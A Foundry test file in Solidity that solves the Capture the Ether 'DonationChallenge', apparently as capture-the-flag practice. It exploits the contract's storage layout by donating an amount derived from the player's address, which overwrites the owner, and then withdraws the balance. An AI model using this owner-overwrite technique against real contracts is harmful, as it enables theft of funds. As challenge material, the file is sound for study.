// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "forge-std/Test.sol";
import "../../src/math/5.sol";

contract DonationChallengeTest is Test {
    DonationChallenge target;
    address player;
    function setUp() public {
        player = vm.addr(1);
        vm.deal(player, 100 ether);
        target = new DonationChallenge{value: 1 ether}();
    }

    function testComplete() public {
        vm.startPrank(player);
        uint256 addressValue = uint256(player);
        emit log_named_address("attacker", player);
        emit log_named_uint("address value", addressValue);
        emit log_named_bytes32("address bytes32", bytes32(uint256(player)));
        emit log_named_bytes32("uint256 bytes32", bytes32(addressValue));
        target.donate{value: addressValue / 1e36}(addressValue);
        target.withdraw();
        assertTrue(target.isComplete());
    }
}